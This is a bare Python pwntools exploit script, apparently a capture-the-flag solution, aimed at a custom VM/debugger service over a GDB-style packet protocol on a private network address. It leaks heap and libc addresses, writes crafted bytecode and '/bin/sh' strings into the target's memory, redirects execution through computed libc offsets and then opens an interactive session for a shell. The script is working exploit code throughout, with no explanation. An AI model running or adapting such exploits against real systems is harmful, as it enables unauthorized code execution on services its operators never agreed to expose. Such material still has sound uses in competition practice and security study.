from pwn import *
import struct

#context.update(endian='big')
context.log_level='debug'

def packet(data):
    checksum = '{:02x}'.format(sum(ord(c) for c in data)&0xFF)
    return '$' + data + '#' + checksum + '+'


def rest():
    data = r.recvuntil('#')
    r.recv(2)
    return data

def consume():
    crap = r.recvuntil('+')
    #print 'notification:', crap
    if r.recv(1) != '$':
        #r.interactive()
        raise Exception('wut')
    data = rest()
    r.send('+')
    return data

def ex(data):
    r.send(packet(data))
    return consume()

def ex2(data):
    r.send(packet(data))

def regs():
    data = ex('g').strip('#').decode('hex')
    return struct.unpack('23I', data)

def step():
    r.send(packet('c'))
    r.recvuntil('+')

def mem(d, l):
    data = ex('m{:x},{:x}'.format(d, l))
    return data.strip('#').decode('hex')

def setmem(d, dat):
    l = len(dat)
    ex('M{:x},{:x}:{:s}'.format(d, l, dat.encode('hex')))


def pregs():
    re = regs()
    print 'regs', ' '.join('{:08x}'.format(c) for c in re)
    return re

def makeregs(r0=0, r1=0, r2=0, r3=0, r4=0, r5=0, r6=0, r7=0, r8=0, 
            r9=0, r10=0, r11=0, r12=0, r13=0, r14=0, r15=0, pc=0, 
            sp=512, flag=0, blkinst=0, totalinst=0, blkcnt=0):
    a = [
            r0, r1, r2, r3, r4, r5, r6, r7,
            r8, r9, r10, r11, r12, r13, r14, r15,
            pc, sp, flag, blkinst, totalinst, blkcnt
    ]
    rr=''.join(p32(aa) for aa in a)
    r.send(packet(('G'+rr)))
    r.recvuntil('-')

def exploit():
    global r
    # r = remote('127.0.0.1', 2333)
    r = remote('172.16.5.34', 5050)
    for i in range(13):
        ex('Z0,0x,0x')
    for i in range(2):
        ex('z0,0x,0x')
    ex('M0,24:430f1e1000000b0f020000000a0000000000')
    ex('M12,24:430f101000000b0f020000000a0100000000')
    ex('M24,2:15')
    r.send(packet(('C')))
    r.recvuntil('thread')
    re = regs()
    heap = re[0]
    print map(hex,re)
    print 'heap',hex(heap)
    pause()
    for i in range(2):
        ex('Z0,0x,0x')
    ex('M24,30:430fec0f0000430ea10000000b0f020000000b0e00000000')
    ex('M3c,2:15')
    r.send(packet(('C')))
    ex('z0,0x,0x')
    ex('M3c,24:430fe20f00000b0f020000000a0000000000')
    ex('M4e,24:430fd40f00000b0f020000000a0100000000')
    ex('M60,2:15')
    r.send(packet(('C')))
    r.recvuntil('thread')
    re = regs()
    libc = re[0] + re[1]*(1<<32)
    print 'libc',hex(libc)
    # pause()
    ex('M60,30:430fa80f0000430e2f62696e0b0f020000000b0e00000000')
    ex('M78,30:430f940f0000430e2f7368000b0f020000000b0e00000000')
    ex('90,3c:430f7a0f0000430ea1000000440e400000000b0f020000000b0e00000000')
    off1=libc+2456
    tmp=p64(off1).encode('hex')
    print tmp[:8]
    pause()
    pay='Mae,30:430f720f0000430e'+tmp[:8]+'0b0f020000000b0e00000000'
    ex(pay)
    pay='Mc6,30:430f5e0f0000430e'+tmp[8:]+'0b0f020000000b0e00000000'
    ex(pay)
    ex('Mde,2:15')
    r.send(packet(('C')))

    pay='Mde,30:430fea0f0000430e'+p32(heap).encode('hex')+'0b0f020000000b0e00000000'
    ex(pay)
    ex('Mf6,30:430fd60f0000430e000000000b0f020000000b0e00000000')
    ex('M10e,2:15')
    r.send(packet(('C')))

    pay='M10e,30:430fd20f0000430e'+p32(heap+288).encode('hex')+'0b0f020000000b0e00000000'
    ex(pay)
    ex('M126,30:430fbe0f0000430e000000000b0f020000000b0e00000000')
    ex('M13e,2:15')
    r.send(packet(('C')))

    ex('M13e,30:430fca0f0000430e010000000b0f020000000b0e00000000')
    ex('M156,30:430fb60f0000430e000000000b0f020000000b0e00000000')
    ex('M16e,30:430fa20f0000430e020000000b0f020000000b0e00000000')
    ex('M186,2:15')
    r.send(packet(('C')))

    ex('M186,30:430f8e0f0000430e000000000b0f020000000b0e00000000')
    ex('M19e,30:430f7a0f0000430e030000000b0f020000000b0e00000000')
    ex('M1b6,30:430f660f0000430e000000000b0f020000000b0e00000000')
    ex('M1ce,2:15')
    r.send(packet(('C')))

    off2 = libc-3667944
    tmp=p64(off2).encode('hex')
    pay='M1ce,30:430f520f0000430e'+tmp[:8]+'0b0f020000000b0e00000000'
    ex(pay)
    pay='M1e6,30:430f3e0f0000430e'+tmp[8:]+'0b0f020000000b0e00000000'
    ex(pay)
    ex('M1fe,2:15')
    r.send(packet(('C')))

    pay='M1fe,30:430faa0e0000430e'+p32(heap).encode('hex')+'0b0f020000000b0e00000000'
    ex(pay)
    ex('M216,30:430f960e0000430e000000000b0f020000000b0e00000000')
    ex('M22e,2:15')
    ex('C')
    r.send(packet('Z0,0x,0x'))
    r.interactive()


exploit()
